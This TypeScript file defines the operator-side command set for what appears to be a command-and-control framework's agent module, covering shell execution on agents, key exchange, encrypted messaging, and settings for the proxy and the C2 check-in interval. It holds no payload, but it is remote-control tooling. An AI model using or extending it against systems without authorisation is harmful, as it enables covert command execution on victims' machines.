import { Constants } from "../utils/utils";
import BaseModule from "./base";

export default class AgentModule extends BaseModule {
    constructor(protected configFile) {
        super("agent", configFile);

        this.config = this.loadConfig;

        this.defineCommands({
            sysinfo: {
                arguments: [],
                description: "get system info",
            },
            keyx: {
                arguments: [],
                description: "start a key exchange with the agent",
            },
            agents: {
                arguments: [],
                description: "show active agents",
            },
            interact: {
                arguments: ["<agent id>"],
                description: "interact with an agent",
            },
            shell: {
                arguments: ["<command>"],
                description: "execute a shell command, alias: exec_cmd",
            },
            msg: {
                arguments: ["<message>"],
                description: "send an encrypted message to the agent, requires keyx",
            },
            shutdown: {
                arguments: ["<agent id>"],
                description: "shutdown the agent, confirm by entering the id, agent will not reconnect",
            },
            debug: {
                arguments: [],
                description: "show verbose messages",
            },
            help: {
                arguments: [],
                description: "show available commands",
            },
            "set proxy_url": {
                arguments: ["<url>"],
                description: "set the proxy url to use (http://proxy.domain.tld/proxy.php)",
                validateRegex: Constants.VALID_URL_REGEX,
            },
            "set proxy_enabled": {
                arguments: ["<1|0>"],
                description: "enable or disable proxy communication",
            },
            "set proxy_key": {
                arguments: ["<key>"],
                description: "key to use for proxy communication",
            },
            "set interval": {
                arguments: ["<ms>"],
                description: "how often to checkin with the c2 (dns or proxy)",
                validateRegex: /^[0-9]+$/,
            },
            // "set domain": {
            //     arguments: ["<c2.domain.tld>"],
            //     description: "set the c2 domain"
            // },
            // "set password": {
            //     arguments: ["<password>"],
            //     description: "set the c2 password"
            // },
        });
    }

    run() {}
}
